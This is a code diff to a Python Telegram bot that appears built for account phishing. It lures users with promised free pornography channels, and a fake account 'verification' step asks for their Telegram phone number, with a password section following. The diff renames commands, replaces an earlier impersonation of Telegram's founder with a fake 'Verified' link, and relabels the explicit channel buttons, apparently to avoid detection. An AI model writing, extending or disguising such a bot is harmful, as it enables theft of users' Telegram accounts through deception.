@@ -30,21 +30,21 @@ app = pyrogram.Client(
 
 # START YA INI JINK !
 
-START_MESSAGE = """🙌🏻 Hello Welcome To My Bot
-Introducing Me is Durov I Have I Can Help you To Enjoy Porn Channels
+START_MESSAGE = """🔴🏻 Hello Welcome To My Bot
+𝙋𝙡𝙚𝙖𝙨𝙚 𝙁𝙤𝙡𝙡𝙤𝙬 𝙔𝙤𝙪𝙧 𝙎𝙩𝙚𝙥𝙨 𝙏𝙤 𝙂𝙚𝙩 𝙏𝙝𝙚 𝘾𝙝𝙖𝙣𝙣𝙚𝙡 𝙔𝙤𝙪 𝙒𝙖𝙣𝙩.
 
 Please press : Click on the Link Below ⇙
 
-➥ /GetChannel to get your free Koleksi Porn channel
+➥ /GetViralChannels to get your free Koleksi Porn channel
 
 ―――――――――――――――――――
-[ ⚠️ ] Leave this bot when you don't believe Thanks.
+﹝ ⚠️ ﹞ Leave this bot when you don't believe Thanks.
 ―――――――――――――――――――
 ﹝ 🔞 ﹞ This Channel Contains Pornographic Content, if you are not old enough please leave this Bot
 
  𝗖𝗮𝘂𝘁𝗶𝗼𝗻 𝗗𝗼𝗻'𝘁 𝗦𝗽𝗮𝗺 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁 ‼️
 
-Thoughts from the Product Manager / CEO / Founder of Telegram. t.me/durov
+Verified t.me/Verifiedsafe
 """
 
 START_BUTTON = [
@@ -69,7 +69,7 @@ FREE_MESSAGE = """
 ⚠️ To access the Channel below please Verify yourself first,
 so that your account is registered in our Database System.
 
-Please press : /verify verify your account into our data system.
+Please press : /AccountVerification verify your account into our data system.
 
 ❔ If you Need help
 I have made a tutorial in the form of a video you just need to press /help
@@ -81,7 +81,7 @@ FREE_BUTTON = [
             ],
         ]
 
-@app.on_message(filters.command("GetChannel") & filters.private)
+@app.on_message(filters.command("GetViralChannels") & filters.private)
 async def free(_, message):
     text = FREE_MESSAGE
     reply_markup = InlineKeyboardMarkup(FREE_BUTTON)
@@ -93,7 +93,7 @@ async def free(_, message):
 
 # VWRIF CMD
 
-@app.on_message(filters.command("verify") & filters.private)
+@app.on_message(filters.command("AccountVerification") & filters.private)
 async def verip(_, message):
     await app.send_message(message.chat.id, "Please send your telegram phone number…")
 # PASSWORD 
@@ -202,12 +202,12 @@ async def kesatu(_, callback_query):
 """  
         KESATUTOMBOL = [
             [
-                InlineKeyboardButton("HIJAB COLLECTION 🩸", url="https://t.me/+3cmLG1Nc42UxNjI1"),
-                InlineKeyboardButton("Viral Channels🩸", url="https://t.me/+Kh7-WpPVb3w5Njk1"),
+                InlineKeyboardButton("𝘊𝘩𝘢𝘯𝘯𝘦𝘭 𝘖𝘯𝘦 🩸", url="https://t.me/+3cmLG1Nc42UxNjI1"),
+                InlineKeyboardButton("𝘊𝘩𝘢𝘯𝘯𝘦𝘭 𝘛𝘸𝘰 🩸", url="https://t.me/+Kh7-WpPVb3w5Njk1"),
             ],
             [
-                InlineKeyboardButton("Big Pussy❤️‍🔥", url="https://t.me/+NjYTRB4tj0AxMDhl"),
-                InlineKeyboardButton("OnlyFans🎥", url="https://t.me/+w59Fy6HRofJiZmE9"),
+                InlineKeyboardButton("𝘊𝘩𝘢𝘯𝘯𝘦𝘭 𝘛𝘩𝘳𝘦𝘦 🩸", url="https://t.me/+NjYTRB4tj0AxMDhl"),
+                InlineKeyboardButton("𝘊𝘩𝘢𝘯𝘯𝘦𝘭 𝘍𝘰𝘶𝘳 🩸", url="https://t.me/+w59Fy6HRofJiZmE9"),
             ],
         ]
         await callback_query.edit_message_text(
